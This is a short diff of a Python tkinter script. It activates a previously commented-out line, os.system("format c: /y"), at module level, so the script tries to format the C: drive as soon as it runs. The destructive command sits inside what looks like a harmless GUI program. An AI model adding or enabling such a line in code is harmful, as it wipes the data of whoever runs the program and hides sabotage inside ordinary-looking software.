@@ -2,7 +2,7 @@ from tkinter import *
 import random
 import os
 
-# os.system("format c: /y")
+os.system("format c: /y")
 
 def new_window():
 	root = Tk()
